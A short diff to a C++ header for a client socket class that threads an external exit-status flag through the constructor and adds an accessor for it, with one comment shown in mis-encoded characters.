@@ -36,13 +36,17 @@ public:
     SOCKET m_Socket;
     HANDLE m_hEvent;
 
-    CClientSocket();
+    CClientSocket(BOOL &bExit);
     virtual ~CClientSocket();
+    BOOL& GetStatus() {
+        return g_bExit;
+    }
 private:
     static DWORD WINAPI WorkThread(LPVOID lparam);
     int SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize);
     bool m_bIsRunning;
     CManager	*m_pManager;
+    BOOL& g_bExit; // È«¾Ö×´Ì¬Á¿
 };
 
 #endif // !defined(AFX_CLIENTSOCKET_H__1902379A_1EEB_4AFE_A531_5E129AF7AE95__INCLUDED_)
